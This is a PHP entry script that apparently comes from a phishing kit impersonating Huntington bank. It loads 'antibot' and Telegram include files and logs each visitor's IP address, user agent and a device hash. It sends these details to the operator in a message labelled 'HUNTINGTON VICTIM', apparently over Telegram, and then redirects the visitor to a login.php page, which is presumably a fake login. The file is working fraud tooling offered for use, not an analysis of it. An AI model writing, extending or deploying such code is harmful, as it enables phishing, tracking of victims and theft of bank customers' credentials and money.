<?php
ob_start();
session_start();
include 'includes/antibot.php';
include_once 'includes/telegram.php';
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$_SESSION['id'] = md5($ip . $user_agent);
$msg = "HUNTINGTON VICTIM\n\n| DEVICE : #{$_SESSION['id']}\n| IP : {$ip}\n| USER AGENT : {$user_agent}";
send_message($msg);
//header('Location: login.php', true);
?>
<meta http-equiv="Refresh" content="0; url='login.php'" />
